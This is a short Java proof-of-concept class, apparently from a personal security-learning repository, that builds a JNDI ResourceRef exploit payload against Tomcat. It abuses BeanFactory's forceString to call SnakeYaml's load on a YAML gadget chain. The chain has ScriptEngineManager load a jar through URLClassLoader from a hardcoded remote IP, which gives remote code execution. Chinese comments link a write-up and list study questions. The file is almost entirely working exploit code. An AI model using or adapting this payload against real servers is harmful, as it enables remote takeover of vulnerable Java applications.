package com.xjjlearning.hack.java.highjdk.poc;

import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

/**
 * Created by xjj on 2023/5/6.
 */
public class TomcatSnakeYaml implements Payload {

    @Override
    public ResourceRef getPayload() {
//        org.yaml.snakeyaml.Yaml
        ResourceRef ref = new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        String yaml = "!!javax.script.ScriptEngineManager [\n" +
                "  !!java.net.URLClassLoader [[\n" +
                "    !!java.net.URL [\"http://47.95.7.37:9870/tomcat/yaml-payload.jar\"]\n" +
                "  ]]\n" +
                "]";
        ref.add(new StringRefAddr("forceString", "a=load"));
        ref.add(new StringRefAddr("a", yaml));
        return ref;
        /**
         https://xz.aliyun.com/t/11599
         1.格式 为什么是!![], [[]]是什么
         2.为什么需要jar
         3.流程是什么样子的
         */
    }
}
